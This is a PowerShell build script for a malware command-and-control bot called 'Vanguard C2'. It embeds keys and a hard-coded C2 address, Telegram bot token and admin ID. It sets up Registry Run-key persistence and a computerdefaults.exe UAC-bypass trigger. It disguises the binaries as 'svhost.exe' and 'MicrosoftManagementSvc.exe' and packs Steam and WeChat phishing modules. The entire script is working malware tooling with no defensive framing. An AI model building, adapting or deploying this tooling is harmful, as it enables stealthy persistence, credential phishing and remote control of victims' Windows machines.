# Vanguard C2: Ultra-Optimized Monolithic Rebuild Script (V7.4)
$ErrorActionPreference = "Stop"

Write-Host "================================================" -ForegroundColor Cyan
Write-Host "   VANGUARD C2: ULTRA-OPTIMIZED BUILD (GZIP)    " -ForegroundColor Cyan
Write-Host "================================================" -ForegroundColor Cyan

# Configuration
$SessionKey = New-Object Byte[] 32
$MasterKey = New-Object Byte[] 32
$rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::Create()
$rng.GetBytes($SessionKey)
$rng.GetBytes($MasterKey)

$SessionKeyB64 = [System.Convert]::ToBase64String($SessionKey)
$MasterKeyB64 = [System.Convert]::ToBase64String($MasterKey)

# Wrap SessionKey with MasterKey (AES-CBC, Zero IV) for Constants.cs
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $MasterKey
$aes.IV = New-Object Byte[] 16
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::None
$encryptor = $aes.CreateEncryptor()
$encSessionKey = $encryptor.TransformFinalBlock($SessionKey, 0, $SessionKey.Length)
$EncryptedSessionKeyB64 = [System.Convert]::ToBase64String($encSessionKey)

Write-Host "[*] Patching Constants.cs with new synchronized keys..." -ForegroundColor Yellow
$constantsPath = "Core\Constants.cs"
$content = Get-Content $constantsPath -Raw
$content = $content -replace 'public const string MASTER_KEY_B64 = ".*?";', "public const string MASTER_KEY_B64 = `"$MasterKeyB64`";"
$content = $content -replace 'public const string ENCRYPTED_SESSION_KEY_B64 = ".*?";', "public const string ENCRYPTED_SESSION_KEY_B64 = `"$EncryptedSessionKeyB64`";"

# --- Phase 0.1: Black Edition Finalization (Stealth & IPC) ---
Write-Host "[*] Phase 0.1: Randomizing IPC and Stealth Toggles..." -ForegroundColor Cyan

# 1. Disable Debug Mode for Production
$content = $content -replace 'DEBUG_MODE = true', 'DEBUG_MODE = false'

# 2. Randomize IPC markers
$RandIPC = "Vanguard_Event_$( [Guid]::NewGuid().ToString("N").Substring(0, 8) )"
$content = $content -replace 'IPC_EVENT_BASE = ".*?"', "IPC_EVENT_BASE = `"$RandIPC`""

# 3. Randomize AppData subdirectory
$RandDir = "Microsoft\\Update\\$( [Guid]::NewGuid().ToString("N").Substring(0, 6) )"
$content = $content -replace 'APP_DATA_SUBDIR = ".*?"', "APP_DATA_SUBDIR = `"$RandDir`""

# 4. Randomize Version
$RandVer = "$((Get-Date).ToString("yyMM")).$((Get-Random -Minimum 1 -Maximum 9)).$((Get-Random -Minimum 0 -Maximum 99))-BE"
$content = $content -replace 'VERSION = ".*?"', "VERSION = `"$RandVer`""

Set-Content $constantsPath $content

Write-Host "[*] Phase 0: Secure String Hardening (Vault 2.0)..." -ForegroundColor Yellow
$VaultKey = New-Object Byte[] 32
$VaultIV = New-Object Byte[] 12
$rng.GetBytes($VaultKey)
$rng.GetBytes($VaultIV)

$VaultKeyB64 = [System.Convert]::ToBase64String($VaultKey)
$VaultIVB64 = [System.Convert]::ToBase64String($VaultIV)

# Define sensitive strings to be encrypted
$Secrets = @{
    "C2_URL_PRIMARY"     = "185.123.45.67"
    "UA_CHROME"          = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    "REG_RUN"            = "Software\Microsoft\Windows\CurrentVersion\Run"
    "BOT_TOKEN"          = "8497188042:AAFKAy0IJK3K6oFcNoR4CNO5fYPxqo7VcrQ"
    "ADMIN_ID"           = "-1003555531875"
    "TG_API_BASE"        = "https://api.telegram.org/bot"
    "TG_FILE_BASE"       = "https://api.telegram.org/file/bot"
    "GIST_URL"           = "https://gist.githubusercontent.com/raw/"
    "GIST_PROXY_ID"      = "vanguard_proxies"
    "GIST_GITHUB_TOKEN"  = "ghp_random_token_12345"
    "MS_TRIGGER"         = "computerdefaults.exe"
}

# Add-Type for AES-GCM encryption helper
$Source = @"
using System;
using System.Security.Cryptography;
using System.Text;
using System.Collections.Generic;

public class VaultPacker {
    public static string Encrypt(string plainText, byte[] key, byte[] iv, out string tagB64) {
        byte[] plainBytes = Encoding.UTF8.GetBytes(plainText);
        byte[] cipherText = new byte[plainBytes.Length];
        byte[] tag = new byte[16];
        using (AesGcm aes = new AesGcm(key, 16)) {
            aes.Encrypt(iv, plainBytes, cipherText, tag);
        }
        tagB64 = Convert.ToBase64String(tag);
        return Convert.ToBase64String(cipherText);
    }
}
"@
Add-Type -TypeDefinition $Source

$VaultEntries = New-Object "System.Collections.Generic.List[string]"
foreach ($name in $Secrets.Keys) {
    $tag = ""
    $cipher = [VaultPacker]::Encrypt($Secrets[$name], $VaultKey, $VaultIV, [ref]$tag)
    $VaultEntries.Add("            { `"$name`", new VaultEntry { C = `"$cipher`", T = `"$tag`" } }")
}

$VaultCode = [string]::Join(",`n", $VaultEntries)
$SafetyPath = "defense\SafetyManager.cs"
$SafetyContent = Get-Content $SafetyPath -Raw

# Patch the VaultKey and VaultIV
$SafetyContent = $SafetyContent -replace 'private static byte\[\]\? VAULT_KEY;', "private static byte[] VAULT_KEY = Convert.FromBase64String(`"$VaultKeyB64`");"
$SafetyContent = $SafetyContent -replace 'private static byte\[\]\? VAULT_IV;', "private static byte[] VAULT_IV = Convert.FromBase64String(`"$VaultIVB64`");"

# Patch the Dictionary
$Pattern = 'private static readonly Dictionary<string, byte\[\]> _vault = new Dictionary<string, byte\[\]>\s*\{[\s\S]*?\};'
$NewDict = "private static readonly Dictionary<string, VaultEntry> _vault = new Dictionary<string, VaultEntry>`n        {`n$VaultCode`n        };"
$SafetyContent = [System.Text.RegularExpressions.Regex]::Replace($SafetyContent, $Pattern, $NewDict)

Set-Content $SafetyPath $SafetyContent

Write-Host "[*] Phase 1: Nuclear Cleanup..." -ForegroundColor Yellow
Get-Process "svhost" -ErrorAction SilentlyContinue | Stop-Process -Force
Get-Process "MicrosoftManagementSvc" -ErrorAction SilentlyContinue | Stop-Process -Force
Remove-Item -Path "DiscordProSvc\bin", "DiscordProSvc\obj", "bin", "obj", "dist", "svhost.bin", "scripts\publish" -Recurse -Force -ErrorAction SilentlyContinue
if (!(Test-Path "dist")) { New-Item -ItemType Directory -Path "dist" | Out-Null }

Write-Host "[*] Phase 2: Building Resource Packer (Self-Contained)..." -ForegroundColor Cyan
dotnet publish scripts\ResourcePacker.csproj -c Release -r win-x64 --self-contained true -o scripts\publish --nologo
if ($LASTEXITCODE -ne 0) { throw "ResourcePacker Compilation FAILED!" }
$PackerExe = Join-Path (Get-Location).Path "scripts\publish\ResourcePacker.exe"

Write-Host "[*] Phase 3: Building Discord Pro Svc (NativeAOT)..." -ForegroundColor Cyan
dotnet publish DiscordProSvc\DiscordProSvc.csproj -c Release -r win-x64 -p:PublishAot=true --nologo
if ($LASTEXITCODE -ne 0) { throw "DiscordProSvc Build FAILED!" }

$SvcPath = "DiscordProSvc\bin\Release\net8.0-windows\win-x64\publish\DiscordProSvc.exe"
Copy-Item $SvcPath "dist\svhost.exe" -Force

Write-Host "[*] Phase 4: Compressing & Encrypting Resources..." -ForegroundColor Cyan
& $PackerExe "dist\svhost.exe" "svhost.bin" $SessionKeyB64

if (!(Test-Path "svhost.bin")) {
    throw "Critical Resource Error: svhost.bin was NOT created by the packer!"
}

# Pack other large resources if they exist
$OtherResources = @(
    @{ Src = "tools\SteamAlert.exe"; Dest = "SteamAlert.bin" },
    @{ Src = "tools\SteamLogin.exe"; Dest = "SteamLogin.bin" },
    @{ Src = "Modules\WeChat.exe";   Dest = "WeChatPhish.bin" }
)

foreach ($res in $OtherResources) {
    if (Test-Path $res.Src) {
        & $PackerExe $res.Src $res.Dest $SessionKeyB64
    }
}

Write-Host "[*] Phase 5: Final Monolithic AOT Build..." -ForegroundColor Cyan
dotnet publish FinalBot.csproj -c Release -r win-x64 -p:PublishAot=true --nologo
if ($LASTEXITCODE -ne 0) { throw "Core Engine Build FAILED!" }

$FinalExe = "bin\Release\net8.0-windows\win-x64\publish\MicrosoftManagementSvc.exe"
Write-Host "`n[SUCCESS] Ultra-Optimized build complete!" -ForegroundColor Green
Write-Host "[+] Binary: $FinalExe" -ForegroundColor White
$Size = (Get-Item $FinalExe).Length / 1MB
Write-Host "[+] Final Size: $('{0:N2}' -f $Size) MB" -ForegroundColor Yellow

# Final Cleanup
Remove-Item dist, scripts\publish, defense\Constants.cs -Recurse -Force -ErrorAction SilentlyContinue
